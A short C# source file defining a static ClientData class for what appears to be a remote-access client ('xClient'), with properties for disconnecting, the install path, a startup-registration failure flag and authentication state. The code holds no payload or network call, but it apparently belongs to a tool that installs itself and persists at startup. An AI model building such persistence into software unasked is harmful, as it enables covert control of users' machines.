﻿using System.Windows.Forms;

namespace xClient.Core.Data
{
    public static class ClientData
    {
        public static bool Disconnect { get; set; } // when Disconnect is true, stop all running threads
        public static string CurrentPath { get; set; }
        public static string InstallPath { get; set; }
        public static bool AddToStartupFailed { get; set; }
        public static bool IsAuthenticated { get; set; }

        static ClientData()
        {
            CurrentPath = Application.ExecutablePath;
        }
    }
}
